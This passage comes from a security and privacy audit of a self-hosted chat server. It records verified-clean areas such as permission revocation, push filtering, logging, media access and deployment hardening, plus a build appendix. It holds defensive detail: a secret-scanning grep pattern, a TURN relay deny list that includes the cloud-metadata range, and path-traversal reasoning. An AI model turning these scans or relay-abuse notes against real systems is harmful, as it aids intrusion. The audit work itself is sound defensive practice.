`kEventColumns` + `kEditJoin` + `read_event_row` is used by all three readers —
`get_room_events_paginated` (`:1060`), `get_event_by_id` (`:1180`) and `get_events_since`
(`:1484`) — and `kEditJoin` carries `rep.redacted_by IS NULL`, so a redacted replacement
cannot win. No read path can quietly skip edit resolution.

## Mid-session permission revocation is honoured

This is the thing the brief most wanted understood, and it is right.
`PermissionsEngine` memoises only for the lifetime of one engine instance, which is one
request (`Permissions.h:76-88`), and both `build_initial_sync` and
`build_incremental_sync` construct a **fresh** engine (`SyncEngine.cpp:242`, `:305`).
Crucially, the long-poll re-scan loop (`:176-217`) calls `build_incremental_sync` again
on every wake, so a parked `/sync` picks up a revocation on its next re-evaluation
rather than running to timeout on a stale verdict. The revocation itself is written via
`emit_state_event` (`RoomHandler.cpp:196-203`), which calls `notify_new_event()` — so the
wake is immediate.

**An access token is an identity, not a capability.** It keeps working; what it can reach
is re-derived per request.

| Revocation vector | Result |
|---|---|
| `/messages` back-pagination | Refused — VIEW_CHANNEL re-checked per request (`EventHandler.cpp:418`) |
| An old `since` token | Safe — replay is filtered by *current* permissions |
| A parked `/sync` | Safe — fresh engine on every re-scan, woken immediately |
| A live access token | Safe for rooms; confers identity only |
| A cached **media** URL | **NOT safe** — finding 3. The one exception, and it is total |

## Push recipient selection is correct, and it is the load-bearing check in the system

`PushService.cpp:94` applies `perms.can(user_id, n.room_id, kViewChannel)` per recipient,
**before** the notify-level logic, so `level = "all"` cannot override it and neither can
a room-wide mention. The candidate query underneath (`SqliteStore.cpp:2194-2214`) selects
on membership — which, given auto-join, is the whole server — so without this one line
every private channel's plaintext would fan out to every user *and* to the external
gateway. `PermissionsEngine`'s caches are keyed by `user_id` (`Permissions.cpp:55-60`),
so reusing the sender's engine to judge recipients does not smear a verdict. Tested
(`test_push.cpp:558`).

## Unread, notification and highlight counts — clean

Computed by iterating `response.rooms.join`, which is already VIEW_CHANNEL-filtered
(`SyncEngine.cpp:283-290`, `:381-388`). `get_unread_mention_counts` returns every room in
one grouped query but is only ever *looked up* per filtered room, never enumerated. A
message in a channel you cannot see moves no number you can see. `count_unread`
(`:1608-1637`) additionally excludes replacements and redacted rows, so neither an edit
nor a deletion can bump a badge.

## Read markers and receipts — clean

No receipt broadcast and no route reads another user's position;
`set_read_marker`/`get_read_marker` are keyed `(user_id, room_id)` and `get_read_marker`
has no HTTP caller. A read receipt in a private channel reaches nobody.

## Server ban list — clean

`RoomHandler.cpp:1047-1110` gates on `kBanMembers` at **server scope** (the same early
return that protects the audit log), and the content is `user_id`, `actor`, `reason`,
`created_at` — **no IP addresses, no emails, no tokens**.

## No IP address is ever written to the database

Verified by grep across all of `src/`: `req.remote_addr` appears only in
`src/http/ClientAddress.cpp` (in-memory rate limiting) and the one log line at
`AuthHandler.cpp:104-108`. **No schema column anywhere stores an address.** For a product
whose pitch is IP privacy, this is a strong positive and it is worth stating plainly.

## Logging — what is genuinely absent

All 72 log statements were read. **No message body or event content, ever. No access or
refresh token, or any prefix of one. No password or password hash. No `Authorization`
header. No search terms** (`SearchHandler.cpp:197` logs the user id and the exception,
not the query). **No OIDC client secret or id_token. No LiveKit `api_secret` and no TURN
secret** — `Config.cpp:214-223` deliberately prints the literal strings `"missing"` /
`"set"`. **No SQL with bound values** — every statement is prepare + bind. **No HTTP
access log in the application at all** (no `svr.set_logger`), so request URLs never reach
the app log; finding 4 is entirely nginx's default.

## `m.direct` / DM derivation — re-verified adversarially; the prior conclusion holds

Membership genuinely is the DM privacy boundary. `list_public_rooms` (`:677-703`) opens
with `WHERE r.is_direct = 0`, so auto-join can never reach a DM even if a stale
`join_rule="public"` survives on it; `publicize_legacy_channels` (`AutoJoin.cpp:112-152`)
is marker-guarded and excludes DMs; and `refuse_on_direct_room` is applied at invite, at
the generic state back door for `category`/`type`/`join_rules`, at `/category` and at
`/order`. A moderator cannot widen, join, re-file or delete a DM. The only crack is
finding 26, which is cosmetic.

## Media, verified clean

No thumbnail endpoint exists (grep for "thumbnail" across `src/`, `config/`, `tests/`
returns zero), so there is no second differently-gated media path. Path traversal is not
exploitable — httplib percent-decodes before routing, and the DB-row lookup precedes any
filesystem concatenation; note the only thing preventing it is that precondition, so a
`media_id` hex-charset assertion would make it structural rather than incidental. **No
presigned or public S3 URLs are ever generated** (`S3Client` does server-side SigV4 and
proxies bytes), so the finding-3 fix will be enforceable on the S3 backend too. Ranged
requests are careful and well-tested. `require_media_auth` defaults **on** and production
inherits the default. A server ban *does* revoke media access via
`delete_all_tokens_for_user` (`RoomHandler.cpp:331`) — which sharpens finding 3: the
server can revoke media access, it just has no notion of doing so per channel.

## Push, additionally verified clean

Payloads are **never logged** (retry logs carry only user id, attempt and status);
redirects are disabled (`PushService.cpp:204`), closing the obvious allowlist bypass; TLS
verification is on (httplib built with OpenSSL, default
`server_certificate_verification_`) though no test pins it; `event_id_only` is genuinely
honoured; no channel or room **name** ever reaches the gateway; the sender is never
pushed their own message (enforced in SQL); the mention set is unforgeable and
VIEW_CHANNEL-scoped (`EventHandler.cpp:147-148`); delivery is off the request path and
does not hold the store mutex across the outbound HTTP call; and all push SQL is
parameterised.

## Voice roster state — clean on the state paths

`m.call.member` is deliberately excluded from the signalling filter so the roster rides
ordinary room state, and every path that serves room state is gated. There is **no global
"who is in a call" view** — all voice routes are per-room, and the only server-wide sweep
is an internal reaper thread with no client surface. TURN credentials are HMAC-SHA1
ephemeral and the secret is never logged or stored; `livekit_room_key` uses HKDF with
length-prefixed field packing and a domain-separation salt, and refuses empty key
material.

## Long-poll timing — clean and deliberately hardened

The wake loop re-checks and returns to sleep when a wake held nothing visible, with
`checked_pos` advancing to the *scanned* position to guarantee termination
(`SyncEngine.cpp:176-217`). A message in a channel you cannot see does not end your poll.
The residual is the global ephemeral counter, which is what the typing leak rides in on.

## No transactional gaps in the index

`insert_event` wraps the event row, the stream-position head and the search-index write in
one `BEGIN IMMEDIATE` (`:938-1030`), closing the window where a message could be in the
timeline and permanently invisible to search.

## The audit log is append-only at the storage layer

`BEFORE UPDATE` / `BEFORE DELETE` triggers (`Migrations.cpp:781-793`) mean the application
cannot rewrite history — an operator with the file still can, but no code path can.

## `deploy/` — what is genuinely good

- **Port binding.** Both HTTP services are `127.0.0.1:8448` / `127.0.0.1:8480`
  (`docker-compose.yml:27`, `:42`). Nothing is on `0.0.0.0` on the host.
  `bind_address = "0.0.0.0"` inside the containers is correct and scoped by the publish
  rule. The root dev compose is loopback-only too, including MinIO.
- **coturn hardening is thorough** (`config/turnserver.conf.template:75-88`):
  `no-multicast-peers` plus `denied-peer-ip` for `0.0.0.0/8`, `10/8`, CGNAT `100.64/10`,
  loopback, **`169.254/16` (cloud metadata)**, `172.16/12`, `192.0.0/24`, `192.168/16`,
  `198.18/15`, `240/4`, `::1`, `fc00::/7`, `fe80::/10`; `use-auth-secret` (ephemeral only);
  `total-quota=1500`, `user-quota=16`; `no-cli`; `no-tcp-relay`. **This is not an open
  relay.** coturn is version-pinned with a written rationale rather than `:latest`.
- **No committed secret anywhere.** A grep over the whole `deploy/` tree for
  `(secret|password|token|api_key|private_key)\s*[=:]\s*[A-Za-z0-9+/_-]{16,}` returns
  **zero hits**, `.gitignore` excludes `.env` and all four rendered configs with an
  explicit comment, and `git log --all --name-only` shows only the nine template/doc files
  were ever tracked, across all seven commits.
- `setup.sh` generates `TURN_SECRET` with `openssl rand -hex 32` rather than shipping a
  placeholder, `chmod 600 .env`, and refuses to render while `CHAT_HOST` is still
  `example.com`.
- The nginx template carries a prominent, correct warning about Cloudflare Flexible TLS.
- `[tls] enabled = true` without TLS support **throws at startup** rather than silently
  serving plaintext (`src/http/HttpServer.cpp:49-56`).
- `trusted_proxies` in `server.toml.template:43` already includes `172.16.0.0/12`,
  satisfying the documented precondition for the production upgrade.

Two small `deploy/` nits, below the threshold for their own findings: `setup.sh:89` writes
`.env.tmp` at the default umask before the `chmod 600` at `:93` (a one-line `umask 077` at
the top closes it), and `chmod 640 config/server.toml` at `:154` may leave the file
unreadable by the container's uid 10001 — worth testing on a clean host, since the
predictable operator response is `chmod 644`.

---

# Appendix: how the empirical claims were checked

Findings 1 and 9 were verified by building this worktree and running two temporary probe
tests appended to `tests/test_regressions.cpp`, reusing the existing `EditFixture` so the
payloads are exactly what the desktop client sends (`MatrixClient::editMessage`). The
probes were **reverted** afterwards; this branch is docs-only and `git status` is clean.

Build:

```
cmake -S . -B <scratch> -DCMAKE_BUILD_TYPE=Debug \
      -DFETCHCONTENT_SOURCE_DIR_BSFCHAT_PROTOCOL=/Users/josh/dev/gamechat/protocol
nice -n 19 cmake --build . --target server_tests -j2
```

Note the explicit protocol override. `cmake/Dependencies.cmake:5-10` resolves the protocol
library from `../protocol` **relative to the server source dir** — which does not exist
for a worktree under `wt/`, so an unqualified build would silently fetch protocol `main`
from GitHub instead. The auth-hardening document already warns that a green build is not
evidence of which protocol version went in; the same trap applies to anyone reproducing
this audit from a worktree.
